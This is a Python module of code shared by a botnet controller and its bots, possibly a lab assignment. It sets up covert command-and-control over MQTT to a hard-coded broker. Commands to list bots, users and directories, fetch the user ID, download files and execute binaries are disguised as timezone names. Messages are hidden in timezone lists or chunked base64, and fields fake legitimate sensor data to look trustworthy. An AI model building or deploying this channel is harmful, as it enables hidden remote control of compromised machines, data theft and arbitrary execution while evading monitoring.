# Common code for both controller and bot
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from zoneinfo import ZoneInfo
from paho.mqtt import client as mqtt
import random
import base64
import json

# MQTT configuration
MQTT_BROKER = "147.32.82.209"
MQTT_PORT = 1883
MQTT_TOPIC = "sensors"

# Message fields
MSG_FIELD_TO_FAKE_LEGITIMATE = "local_datetime" # will send legitimate local datetime, just to act trustworthy
MSG_FIELD_BOT_ID = "local_datetime_leap"
MSG_FIELD_ENCRYPTED_MSG = "datetime_leap"
MSG_FIELD_TIMEZONES = "timezones"
MSG_FIELD_ACTION = "timezone"

# Commands
CMD_LIST_BOTS = 1
CMD_LIST_USERS = 2
CMD_LIST_DIR = 3
CMD_GET_USER_ID = 4
CMD_DOWNLOAD_FILE = 5
CMD_EXECUTE_BINARY = 6

COMMAND_TO_TIMEZONE = {
    CMD_LIST_BOTS: "America/New_York",
    CMD_LIST_USERS: "America/Los_Angeles",
    CMD_LIST_DIR: "America/Chicago",
    CMD_GET_USER_ID: "Europe/London",
    CMD_DOWNLOAD_FILE: "Europe/Paris",
    CMD_EXECUTE_BINARY: "Europe/Berlin",
}

TIMEZONE_TO_ACTION = {v.upper(): k for k, v in COMMAND_TO_TIMEZONE.items()}

CHAR_TO_TIMEZONE = {
    "a": "America/Argentina/Buenos_Aires",
    "b": "America/Sao_Paulo",
    "c": "America/Toronto",
    "d": "Europe/Dublin",
    "e": "Europe/Madrid",
    "f": "Europe/Paris",
    "g": "Europe/Athens",
    "h": "Europe/Helsinki",
    "i": "Asia/Jerusalem",
    "j": "Asia/Kolkata",
    "k": "Asia/Kathmandu",
    "l": "America/Lima",
    "m": "Europe/Moscow",
    "n": "America/Denver",
    "o": "Australia/Sydney",
    "p": "America/Phoenix",
    "q": "America/Montevideo",
    "r": "America/Recife",
    "s": "America/Santiago",
    "t": "America/Taipei",  # if you want strict uniqueness, see note below
    "u": "Australia/Perth",
    "v": "America/Vancouver",
    "w": "America/Winnipeg",
    "x": "Asia/Ho_Chi_Minh",
    "y": "Asia/Yekaterinburg",
    "z": "Europe/Stockholm",
    "A": "America/Anchorage",
    "B": "Europe/Berlin",
    "C": "America/Chicago",
    "D": "Asia/Dubai",
    "E": "Europe/Edinburgh",
    "F": "America/Fortaleza",
    "G": "Europe/Gibraltar",
    "H": "Pacific/Honolulu",
    "I": "Asia/Istanbul",
    "J": "Asia/Jakarta",
    "K": "Europe/Kiev",
    "L": "Europe/London",
    "M": "America/Mexico_City",
    "N": "America/New_York",
    "O": "Europe/Oslo",
    "P": "Europe/Prague",
    "Q": "America/Quebec",
    "R": "Europe/Rome",
    "S": "Asia/Shanghai",
    "T": "Asia/Tokyo",
    "U": "Asia/Ulaanbaatar",
    "V": "Europe/Vienna",
    "W": "Europe/Warsaw",
    "X": "America/Cancun",  # X is difficult - using location with X sound
    "Y": "America/Yakutat",
    "Z": "Europe/Zurich",
    ",": "Africa/Johannesburg",
    " ": "Africa/Lagos",
    ".": "Africa/Kenya",
    "/": "America/Los_Angeles",
    "~": "Europe/Tallinn",
    "0": "UTC",
    "1": "Africa/Casablanca",
    "2": "Africa/Cairo",
    "3": "Africa/Nairobi",
    "4": "Asia/Baku",
    "5": "Asia/Karachi",
    "6": "Asia/Dhaka",
    "7": "Asia/Bangkok",
    "8": "Asia/Singapore",
    "9": "Asia/Seoul",
}

TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}

@dataclass
class RequestMessage:
    # Will send legitimate local datetime, just to act trustworthy
    local_datetime: str = field(default_factory=lambda: datetime.now().isoformat()) 

    device_id: Optional[str] = None           # Bot ID
    datetime_leap: Optional[str] = None       # Encrypted message
    timezones: Optional[list[str]] = None     # Obfuscated message
    timezone: Optional[str] = None            # User action. Only controller sends this field.
    
    @classmethod
    def from_json(cls, json_str: str):
        try:
            data = json.loads(json_str)
            return cls(**data)
        except Exception:
            # if we can't deserialize - means different contract
            raise UnknownDeviceError()
    
    def to_json(self) -> str:
        json_obj = {}
        if self.local_datetime is not None:
            json_obj["local_datetime"] = self.local_datetime
        if self.device_id is not None:
            json_obj["device_id"] = self.device_id
        if self.datetime_leap is not None:
            json_obj["datetime_leap"] = self.datetime_leap
        if self.timezones is not None:
            json_obj["timezones"] = self.timezones
        if self.timezone is not None:
            json_obj["timezone"] = self.timezone
        return json.dumps(json_obj)
    
    def get_user_action(self):
        if self.timezone is None:
            return None
        action_timezone = self.timezone.upper()
        if action_timezone not in TIMEZONE_TO_ACTION:
            # unknown timezone
            return None
        return TIMEZONE_TO_ACTION[action_timezone]
    
    def set_device_id(self, fake_device_id: str):
        """This device ID will be sent as is. It must look legitimate."""
        self.device_id = fake_device_id

    def set_user_action(self, user_action: int):
        if user_action not in COMMAND_TO_TIMEZONE:
            raise Exception(f"Timezone is missing for action number {user_action}")
        self.timezone = COMMAND_TO_TIMEZONE[user_action]

        try:
            now_utc = datetime.now(ZoneInfo("UTC"))
            self.local_datetime = now_utc.astimezone(ZoneInfo(self.timezone)).isoformat()
        except Exception:
            # ignore error, set anything
            self.local_datetime = datetime.now().isoformat()

    
    def get_message(self):
        if self.datetime_leap is not None:
            return decrypt(self.datetime_leap)
        if self.timezones is not None:
            return deobfuscate(self.timezones)
        return None
    
    def set_message(self, message: str | None):
        """Set message to be sent, either encrypted or obfuscated depending on length."""
        self.datetime_leap = None
        self.timezones = None
        
        if message is None:
            return
        if len(message) <= 100:
            self.timezones = obfuscate(message)
        else:
            self.datetime_leap = encrypt(message)

@dataclass
class ControllerMessage:
    user_action: int
    path: Optional[str] = None

    @classmethod
    def from_request(cls, request: RequestMessage):
        if request.timezone is None:
            raise UnknownDeviceError()
        
        # if no user action is presented, that means the message is not from controller
        user_action = request.get_user_action()
        if user_action is None:
            raise UnknownDeviceError()
        
        path = request.get_message()
        
        return cls(user_action=user_action, path=path)

@dataclass
class BotMessage:
    device_id: Optional[str]
    message: Optional[str]

    @classmethod
    def from_request(cls, request: RequestMessage):
        if request.get_user_action() is not None:
            raise UnknownDeviceError()

        device_id = request.device_id
        message = request.get_message()

        if device_id is None and message is None:
            raise UnknownDeviceError()

        return cls(device_id=device_id, message=message)
        

def encrypt(text: str):
    encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
    
    # char_to_timezone values
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    chunks = []
    i = 0
    while i < len(encoded):
        chunk_size = random.randint(7, 20)
        chunks.append(encoded[i:i+chunk_size])
        i += chunk_size
    
    # create JSON mapping timezones to chunks, cycling through timezones if needed
    result = {}
    for idx, chunk in enumerate(chunks):
        timezone = timezones[idx % len(timezones)]
        if timezone not in result:
            result[timezone] = []
        result[timezone].append(chunk)
    
    return json.dumps(result)


def decrypt(encrypted_json: str):
    data = json.loads(encrypted_json)
    
    # char_to_timezone values
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    # Reconstruct chunks in correct order
    chunks = []
    timezone_idx = 0
    chunk_counts = {tz: 0 for tz in timezones}
    
    # Continue until all chunks are collected
    while True:
        current_tz = timezones[timezone_idx % len(timezones)]
        
        if current_tz in data and chunk_counts[current_tz] < len(data[current_tz]):
            chunks.append(data[current_tz][chunk_counts[current_tz]])
            chunk_counts[current_tz] += 1
            timezone_idx += 1
        else:
            # Check if we've collected all chunks
            all_collected = all(
                tz not in data or chunk_counts[tz] == len(data[tz])
                for tz in timezones
            )
            if all_collected:
                break
            timezone_idx += 1
            
        # Safety check to avoid infinite loop
        if timezone_idx > 10000:
            break
    
    # Concatenate chunks and decode
    encoded = ''.join(chunks)
    decoded = base64.b64decode(encoded).decode('utf-8')
    return decoded

def obfuscate(message: str) -> list[str]:
    """Convert message to list of timezones. Convert each character to its corresponding timezone"""
    obfuscated = []
    for char in message:
        if char in CHAR_TO_TIMEZONE:
            obfuscated.append(CHAR_TO_TIMEZONE[char])
        else: # char missing in dictionary
            obfuscated.append(CHAR_TO_TIMEZONE[' '])
    return obfuscated

def deobfuscate(obfuscated_msg: list[str]) -> str:
    """Convert list of timezones back to message"""
    deobfuscated = []
    for tz in obfuscated_msg:
        if tz.upper() in TIMEZONE_TO_CHAR:
            deobfuscated.append(TIMEZONE_TO_CHAR[tz.upper()])
    return ''.join(deobfuscated)

class UnknownDeviceError(Exception):
    """Message received from unknown device."""
    pass